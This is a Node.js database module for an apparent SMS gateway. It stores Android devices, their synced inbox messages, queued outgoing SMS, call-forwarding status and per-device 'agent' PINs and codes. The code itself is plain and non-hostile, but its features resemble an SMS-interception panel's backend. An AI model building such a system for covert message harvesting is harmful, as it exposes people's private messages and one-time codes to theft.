const initSqlJs = require('sql.js');
const fs = require('fs');
const path = require('path');

const dataDir = process.env.RENDER ? '/var/data' : path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}
const dbPath = path.join(dataDir, 'gateway.db');

let db = null;

async function initDB() {
    const SQL = await initSqlJs();

    if (fs.existsSync(dbPath)) {
        const buffer = fs.readFileSync(dbPath);
        db = new SQL.Database(buffer);
    } else {
        db = new SQL.Database();
    }

    // Create tables
    db.run(`
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT DEFAULT 'Unknown Device',
            android_version INTEGER DEFAULT 0,
            sim1_number TEXT DEFAULT '',
            sim2_number TEXT DEFAULT '',
            agent_pin TEXT DEFAULT '',
            funny_code TEXT DEFAULT '',
            employee_code TEXT DEFAULT '',
            joining_date TEXT DEFAULT '',
            registered_at TEXT DEFAULT (datetime('now')),
            last_seen TEXT DEFAULT (datetime('now')),
            is_online INTEGER DEFAULT 0,
            is_favorite INTEGER DEFAULT 0,
            total_sms INTEGER DEFAULT 0,
            cf_active INTEGER DEFAULT 0,
            cf_number TEXT DEFAULT '',
            cf_updated_at TEXT DEFAULT ''
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sms_id TEXT DEFAULT '',
            address TEXT NOT NULL,
            body TEXT DEFAULT '',
            date INTEGER NOT NULL,
            folder TEXT DEFAULT 'inbox',
            is_read INTEGER DEFAULT 0,
            created_at TEXT DEFAULT (datetime('now')),
            UNIQUE(device_id, sms_id, address, date)
        )
    `);

    db.run(`CREATE INDEX IF NOT EXISTS idx_messages_device ON messages(device_id)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_messages_date ON messages(device_id, date DESC)`);

    db.run(`
        CREATE TABLE IF NOT EXISTS sent_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            msg_id TEXT DEFAULT '',
            to_number TEXT NOT NULL,
            body TEXT DEFAULT '',
            sim INTEGER DEFAULT 0,
            status TEXT DEFAULT 'pending',
            error TEXT DEFAULT '',
            created_at TEXT DEFAULT (datetime('now')),
            updated_at TEXT DEFAULT (datetime('now'))
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS agent_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            field TEXT NOT NULL,
            old_value TEXT DEFAULT '',
            new_value TEXT DEFAULT '',
            changed_at TEXT DEFAULT (datetime('now'))
        )
    `);
    db.run(`CREATE INDEX IF NOT EXISTS idx_agent_history ON agent_history(device_id, changed_at DESC)`);

    // Add new columns if they don't exist (for migration)
    try { db.run(`ALTER TABLE devices ADD COLUMN sim1_number TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN sim2_number TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN agent_pin TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN funny_code TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN joining_date TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN employee_code TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN is_favorite INTEGER DEFAULT 0`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN cf_active INTEGER DEFAULT 0`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN cf_number TEXT DEFAULT ''`); } catch(e) {}
    try { db.run(`ALTER TABLE devices ADD COLUMN cf_updated_at TEXT DEFAULT ''`); } catch(e) {}

    saveDB();
    console.log('✓ Database initialized at', dbPath);
    return db;
}

function saveDB() {
    if (!db) return;
    const data = db.export();
    const buffer = Buffer.from(data);
    fs.writeFileSync(dbPath, buffer);
}

setInterval(() => { if (db) saveDB(); }, 30000);

// ============ Database Operations ============

const dbOps = {
    upsertDevice(deviceId, name, androidVersion, sim1, sim2) {
        db.run(`
            INSERT INTO devices (device_id, name, android_version, sim1_number, sim2_number, last_seen, is_online)
            VALUES (?, ?, ?, ?, ?, datetime('now'), 1)
            ON CONFLICT(device_id) DO UPDATE SET
                name = ?,
                android_version = ?,
                sim1_number = CASE WHEN ? != '' THEN ? ELSE sim1_number END,
                sim2_number = CASE WHEN ? != '' THEN ? ELSE sim2_number END,
                last_seen = datetime('now'),
                is_online = 1
        `, [deviceId, name, androidVersion, sim1 || '', sim2 || '',
            name, androidVersion, sim1 || '', sim1 || '', sim2 || '', sim2 || '']);
        saveDB();
    },

    updateAgentInfo(deviceId, agentPin, funnyCode, joiningDate, employeeCode, sim1, sim2) {
        // Get old values for history
        const old = this.getDevice(deviceId);
        if (old) {
            const fields = [
                { name: 'Agent PIN', oldVal: old.agent_pin || '', newVal: agentPin || '' },
                { name: 'Employee Code', oldVal: old.employee_code || '', newVal: employeeCode || '' },
                { name: 'Funny Code', oldVal: old.funny_code || '', newVal: funnyCode || '' },
                { name: 'Joining Date', oldVal: old.joining_date || '', newVal: joiningDate || '' }
            ];
            for (const f of fields) {
                if (f.newVal && f.newVal !== f.oldVal) {
                    db.run(`INSERT INTO agent_history (device_id, field, old_value, new_value) VALUES (?, ?, ?, ?)`,
                        [deviceId, f.name, f.oldVal, f.newVal]);
                }
            }
        }
        db.run(`
            UPDATE devices SET 
                agent_pin = ?,
                funny_code = ?,
                joining_date = ?,
                employee_code = ?,
                sim1_number = CASE WHEN ? != '' THEN ? ELSE sim1_number END,
                sim2_number = CASE WHEN ? != '' THEN ? ELSE sim2_number END
            WHERE device_id = ?
        `, [agentPin, funnyCode, joiningDate, employeeCode, sim1 || '', sim1 || '', sim2 || '', sim2 || '', deviceId]);
        saveDB();
    },

    setDeviceOffline(deviceId) {
        db.run(`UPDATE devices SET is_online = 0, last_seen = datetime('now') WHERE device_id = ?`, [deviceId]);
        saveDB();
    },

    setDeviceOnline(deviceId) {
        db.run(`UPDATE devices SET is_online = 1, last_seen = datetime('now') WHERE device_id = ?`, [deviceId]);
        saveDB();
    },

    getDevice(deviceId) {
        const stmt = db.prepare(`SELECT * FROM devices WHERE device_id = ?`);
        stmt.bind([deviceId]);
        if (stmt.step()) { const row = stmt.getAsObject(); stmt.free(); return row; }
        stmt.free();
        return null;
    },

    getAllDevices() {
        const results = [];
        const stmt = db.prepare(`
            SELECT d.*, 
                (SELECT COUNT(*) FROM messages WHERE device_id = d.device_id) as total_sms
            FROM devices d ORDER BY last_seen DESC
        `);
        while (stmt.step()) results.push(stmt.getAsObject());
        stmt.free();
        return results;
    },

    updateDeviceSmsCount(deviceId) {
        db.run(`UPDATE devices SET total_sms = (SELECT COUNT(*) FROM messages WHERE device_id = ?) WHERE device_id = ?`, [deviceId, deviceId]);
    },

    // --- Messages ---
    insertMessage(deviceId, smsId, address, body, date, folder, isRead) {
        try {
            db.run(`INSERT OR IGNORE INTO messages (device_id, sms_id, address, body, date, folder, is_read) VALUES (?, ?, ?, ?, ?, ?, ?)`,
                [deviceId, smsId, address, body, date, folder, isRead ? 1 : 0]);
            return true;
        } catch (e) { return false; }
    },

    insertMessages(messages) {
        let inserted = 0;
        db.run("BEGIN TRANSACTION");
        try {
            for (const m of messages) {
                try {
                    db.run(`INSERT OR IGNORE INTO messages (device_id, sms_id, address, body, date, folder, is_read) VALUES (?, ?, ?, ?, ?, ?, ?)`,
                        [m.device_id, m.sms_id, m.address, m.body, m.date, m.folder, m.is_read]);
                    if (db.getRowsModified() > 0) inserted++;
                } catch (e) {}
            }
            db.run("COMMIT");
        } catch (e) {
            db.run("ROLLBACK");
        }
        saveDB();
        return inserted;
    },

    getMessages(deviceId, limit, offset) {
        const results = [];
        const stmt = db.prepare(`SELECT * FROM messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?`);
        stmt.bind([deviceId, limit, offset]);
        while (stmt.step()) results.push(stmt.getAsObject());
        stmt.free();
        return results;
    },

    searchMessages(deviceId, search, limit, offset) {
        const results = [];
        const pattern = `%${search}%`;
        const stmt = db.prepare(`SELECT * FROM messages WHERE device_id = ? AND (address LIKE ? OR body LIKE ?) ORDER BY date DESC LIMIT ? OFFSET ?`);
        stmt.bind([deviceId, pattern, pattern, limit, offset]);
        while (stmt.step()) results.push(stmt.getAsObject());
        stmt.free();
        return results;
    },

    getMessageCount(deviceId) {
        const stmt = db.prepare(`SELECT COUNT(*) as count FROM messages WHERE device_id = ?`);
        stmt.bind([deviceId]);
        stmt.step();
        const result = stmt.getAsObject();
        stmt.free();
        return result.count || 0;
    },

    // ★ DELETE message
    deleteMessage(messageId) {
        db.run(`DELETE FROM messages WHERE id = ?`, [messageId]);
        saveDB();
        return db.getRowsModified() > 0;
    },

    // ★ DELETE multiple messages
    deleteMessages(messageIds) {
        const placeholders = messageIds.map(() => '?').join(',');
        db.run(`DELETE FROM messages WHERE id IN (${placeholders})`, messageIds);
        saveDB();
        return db.getRowsModified();
    },

    // --- Sent Messages ---
    insertSentMessage(deviceId, msgId, toNumber, body, sim) {
        db.run(`INSERT INTO sent_messages (device_id, msg_id, to_number, body, sim, status) VALUES (?, ?, ?, ?, ?, 'pending')`,
            [deviceId, msgId, toNumber, body, sim]);
        saveDB();
    },

    updateSentStatus(msgId, status, error) {
        db.run(`UPDATE sent_messages SET status = ?, error = ?, updated_at = datetime('now') WHERE msg_id = ?`, [status, error, msgId]);
        saveDB();
    },

    getSentMessages(deviceId) {
        const results = [];
        const stmt = db.prepare(`SELECT * FROM sent_messages WHERE device_id = ? ORDER BY created_at DESC LIMIT 50`);
        stmt.bind([deviceId]);
        while (stmt.step()) results.push(stmt.getAsObject());
        stmt.free();
        return results;
    },

    toggleFavorite(deviceId) {
        db.run(`UPDATE devices SET is_favorite = CASE WHEN is_favorite = 1 THEN 0 ELSE 1 END WHERE device_id = ?`, [deviceId]);
        saveDB();
        const d = this.getDevice(deviceId);
        return d ? d.is_favorite : 0;
    },

    getAgentHistory(deviceId) {
        const results = [];
        const stmt = db.prepare(`SELECT * FROM agent_history WHERE device_id = ? ORDER BY changed_at DESC LIMIT 100`);
        stmt.bind([deviceId]);
        while (stmt.step()) results.push(stmt.getAsObject());
        stmt.free();
        return results;
    },

    updateCallForwardStatus(deviceId, active, number) {
        db.run(`
            UPDATE devices SET
                cf_active = ?,
                cf_number = ?,
                cf_updated_at = datetime('now')
            WHERE device_id = ?
        `, [active ? 1 : 0, number || '', deviceId]);
        saveDB();
    }
};

module.exports = { initDB, dbOps, saveDB };
